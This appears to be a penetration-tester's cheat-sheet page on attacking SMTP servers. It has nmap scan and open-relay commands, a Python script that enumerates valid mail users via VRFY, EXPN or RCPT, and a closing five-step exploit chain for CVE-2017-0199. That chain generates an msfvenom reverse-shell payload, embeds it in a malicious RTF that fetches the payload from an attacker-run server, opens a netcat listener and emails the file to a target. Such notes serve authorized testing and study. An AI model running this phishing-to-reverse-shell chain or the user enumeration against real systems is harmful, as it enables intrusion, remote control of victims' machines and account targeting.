# Simple Mail Transfer Protocol

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Footprinting The Service

### **Nmap**

{% code overflow="wrap" %}
```
sudo nmap 10.129.14.128 -sC -sV -p25
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **Nmap - Open Relay**

{% code overflow="wrap" %}
```
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Enumerate users

Response codes from smtp servers may vary example code 250 & 252 is considered a valid user and smtp-user-enum checks only for 250

Without Domain

```
smtp-user-enum -M VRFY -U wordlist -t IP
```

With Domain

```
smtp-user-enum -M VRFY -U wordlist -t IP -d example.com
```

I have came across many times where smtp-user-enum has given me false-negatives. Use the following python script

{% code overflow="wrap" %}
```python
import smtplib
import logging
from argparse import ArgumentParser

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger()

def smtp_enum_user(smtp_server, user_list, method="VRFY", port=25, timeout=10, domain="example.com"):
    try:
        server = smtplib.SMTP(smtp_server, port, timeout=timeout)
        server.ehlo_or_helo_if_needed()

        if method not in ["VRFY", "EXPN", "RCPT"]:
            logger.error("Invalid method. Use VRFY, EXPN, or RCPT.")
            return
        
        with open(user_list, 'r') as file:
            users = file.readlines()
        
        for user in users:
            user = user.strip()
            if not user:
                continue

            try:
                response = None
                if method == "VRFY":
                    response = server.verify(user)
                elif method == "EXPN":
                    response = server.expn(user)
                elif method == "RCPT":
                    from_address = f"test@{domain}"
                    server.mail(from_address)
                    response = server.rcpt(f'<{user}@{domain}>')
                
                if response:
                    code, message = response
                    if code == 250:
                        logger.info(f"User {user} exists: {message}")
                    elif code == 550:
                        logger.info(f"User {user} does not exist: {message}")
                    else:
                        logger.info(f"Received response {code} for user {user}: {message}")
            except smtplib.SMTPServerDisconnected:
                logger.error("Server disconnected unexpectedly")
                break
            except Exception as e:
                logger.error(f"Error querying user {user}: {str(e)}")
        
        server.quit()
    except Exception as e:
        logger.error(f"Failed to connect to SMTP server: {str(e)}")

def main():
    parser = ArgumentParser(description="SMTP User Enumeration Script")
    parser.add_argument("-s", "--server", required=True, help="Target SMTP server IP or hostname")
    parser.add_argument("-u", "--userlist", required=True, help="Path to the list of usernames")
    parser.add_argument("-m", "--method", default="VRFY", choices=["VRFY", "EXPN", "RCPT"], help="Enumeration method (default: VRFY)")
    parser.add_argument("-p", "--port", default=25, type=int, help="SMTP server port (default: 25)")
    parser.add_argument("-t", "--timeout", default=10, type=int, help="Connection timeout in seconds (default: 10)")
    parser.add_argument("-d", "--domain", default="example.com", help="Domain to construct a valid email address (default: example.com)")
    
    args = parser.parse_args()

    smtp_enum_user(args.server, args.userlist, args.method, args.port, args.timeout, args.domain)

if __name__ == "__main__":
    main()

```
{% endcode %}

#### [RTF Vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2017-0199)

1. msfvenom -p windows/shell\_reverse\_tcp LHOST=local-IP LPORT=443 -f hta-psh -o msfv.hta
2. python2 cve-2017-0199\_toolkit.py -M gen -t RTF -w MailFile.RTF -u http://local-WebServIP:Port/msfv.hta
3. python2 -m SimpleHTTPServer 80
4. nc -lnvp 443
5. sendEmail -f FromEmail@example.com -t ToEmail@example.com -u "Subject" -m "Message" -a MailFile.RTF -s TargetIP -v
